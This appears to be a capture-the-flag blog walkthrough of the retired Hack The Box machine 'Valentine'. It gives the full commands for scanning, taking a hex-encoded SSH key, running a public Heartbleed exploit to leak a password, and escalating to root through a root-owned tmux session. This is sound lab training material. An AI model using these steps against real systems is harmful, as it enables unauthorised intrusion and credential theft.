---
layout: post
title: "HTB-Valentine"
categories: HTB-Walkthrough
---


![valentine](/assets/img/valentine/valentine1.png)


Valentine is another OSCP-like box from the HTB 'retired' archive.

As always, we start with nmap.

<h3>Nmap</h3>

`nmap -sV -Pn --min-rate 10000 -p- 10.10.10.79 |tee -a val.txt`

```

Nmap scan report for 10.10.10.79
Host is up (0.12s latency).
Not shown: 34526 filtered ports, 31006 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))
443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```



<hr width="250" size="6">


Checking out the website on port80 we are greeted with a picture.

![omg-pic](/assets/img/valentine/valentine-pic.png)

The source tells us its called 'omg.jpg', I download it, just incase there's some steganography at play here.
It's quite likely that the picture is just a hint at 'heartbleed', a well known https vulnerability, which may come into play on the port443.
Before rushing to that port, its worth enumerating the directories here with `gobuster`.

```
gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh
```

Interesting results:

```

/dev (Status: 301)
/encode (Status: 200)
/encode.php (Status: 200)
/decode (Status: 200)
/decode.php (Status: 200)
/omg (Status: 200)

```

The /dev page is a directory with some interesting contents.

![dev](/assets/img/valentine/valentine-dev.png)


The 'notes' link takes us to a todo list.

![notes](/assets/img/valentine/valentine-notes.png)

It mentions the decode and encode pages, found by gobuster.

The other page 'hype_key' looks like its hex encoded.

I use wget to pick up the key...

`wget http://10.10.10.79/dev/hype_key`

We can decode it with the `xxd` command.

```
cat hype_key | xxd -r -p
```


Using an online hex to text converter we find that its a private rsa key.

![hextotext](/assets/img/valentine/valentine-hextotext.png)


<hr width="250" size="6">


The https port, besides the expected alerts about insecure certificates, takes us again to omg.jpg.

```
gobuster dir -u https://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x .php,.txt,.sh -k
```


<h3>Heartbleed</h3>


I found a simple [heartbleed.py](https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py) exploit on github that works well....

It may need to be executed a number of times, until you see something interesting.

`python heartbleed.py 10.10.10.79 -v`


```
$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==......].......7....~
```

Then we can decode it.

```
echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==" |base64 -d
heartbleedbelievethehype
```

It looks like its the password for the id_rsa we've picked up.


<hr width="250" size="6">

Remember to do `chmod 600 id_rsa` to set the correct permissions on the private key file.

I tried `ssh -i id_rsa root@10.10.10.79` but it didn't work, 
It took a bit of thought before I tried the username `hype`

```
ssh -i id_rsa hype@10.10.10.79
```

The password `heartbleedbelievethehype` worked, and I got user-shell.


<hr width="250" size="6">


Looking at the bash history is fruitful, you should always do `ls -la` in the home folder, and if
.bash_history is not redirected to `2>/dev/null` then it may be worth checking early.

![bash-history](/assets/img/valentine/valentine-bash-history.png)


Checking the running processes, we can see that there's a `tmux` session still running.

```
hype@Valentine:~$ ps aux |grep tmux
root       1024  0.0  0.1  26416  1672 ?        Ss   02:21   0:03 /usr/bin/tmux -S /.devs/dev_sess
hype       5769  0.0  0.0  13576   920 pts/0    S+   05:23   0:00 grep --color=auto tmux
```


We can simply rejoin this session and get root privileges.

```
/usr/bin/tmux -S /.devs/dev_sess
```

Easy to get flags...

```
root@Valentine:/home/hype# cat Desktop/user.txt
e6xxxxxxxxxxxxxxxxxxxxxxxxxxxx50
root@Valentine:/home/hype# cat /root/root.txt
f1xxxxxxxxxxxxxxxxxxxxxxxxxxxxb2
root@Valentine:/home/hype# 
```

Quick roots are always amazing, demonstrating a catastrophic error, misconfiguration and whatnot.


:)






